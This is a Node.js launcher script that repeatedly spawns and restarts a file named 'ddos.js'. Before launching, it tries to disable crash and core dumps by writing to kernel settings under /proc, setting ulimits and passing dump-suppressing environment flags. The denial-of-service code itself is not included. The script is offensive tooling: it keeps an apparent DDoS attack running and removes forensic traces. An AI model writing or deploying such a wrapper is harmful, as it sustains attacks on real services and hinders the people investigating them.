const { spawn } = require("child_process");
const path = require("path");

const SCRIPT_FILE = "ddos.js";
const SCRIPT_PATH = path.join(__dirname, SCRIPT_FILE);

const restartEnabled = process.env.PID !== "0";

let mainProcess;

try {
    const { execSync } = require("child_process");
    try { execSync("echo 0 > /proc/sys/kernel/core_uses_pid", { stdio: "ignore" }); } catch(e) {}
    try { execSync("echo '/dev/null' > /proc/sys/kernel/core_pattern", { stdio: "ignore" }); } catch(e) {}
    try { execSync("ulimit -c 0", { stdio: "ignore" }); } catch(e) {}
    if (process.setrlimit) {
        process.setrlimit(process.constants.RLIMIT_CORE, { soft: 0, hard: 0 });
    }
} catch (error) {}

function start() {
    console.log("Starting main process...");

    mainProcess = spawn("node", ["--no-warnings", SCRIPT_PATH], {
        cwd: __dirname,
        stdio: "inherit",
        shell: false,
        env: {
            ...process.env,
            NODE_DISABLE_CORE_DUMP: "1",
            ELECTRON_DISABLE_STACK_DUMPING: "1"
        }
    });

    mainProcess.on("error", (err) => {
        console.error("Error occurred while starting the process:", err);
    });

    mainProcess.on("close", (exitCode) => {
        console.log(`Process exited with code [${exitCode}]`);
        if (restartEnabled) {
            console.log("Restarting process...");
            restartProcess();
        } else {
            console.log("Shutdown initiated...");
            process.exit(exitCode);
        }
    });
}

function restartProcess() {
    if (mainProcess && mainProcess.pid) {
        mainProcess.kill("SIGKILL");
        console.log("Main process killed. Restarting...");
    }
    start();
}

start();